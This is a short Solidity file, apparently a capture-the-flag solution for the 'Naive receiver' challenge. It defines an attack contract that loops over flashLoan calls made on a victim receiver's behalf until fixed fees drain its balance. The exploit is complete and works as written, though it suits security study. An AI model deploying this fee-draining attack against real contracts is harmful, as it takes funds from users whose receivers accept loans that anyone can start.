// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title AttackerContract
 * @author Edoardo Ierina
 */
contract NaiveReceiverAttackContract {

    using SafeMath for uint256;
    NaiveReceiverLenderPool private pool;


    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address naiveReceiverAddress) external {
        uint256 maxLoans = address(naiveReceiverAddress).balance.div(pool.fixedFee());

        for(uint256 i=0; i<maxLoans; i++) {
            pool.flashLoan(naiveReceiverAddress, 0);
        }
    }
}
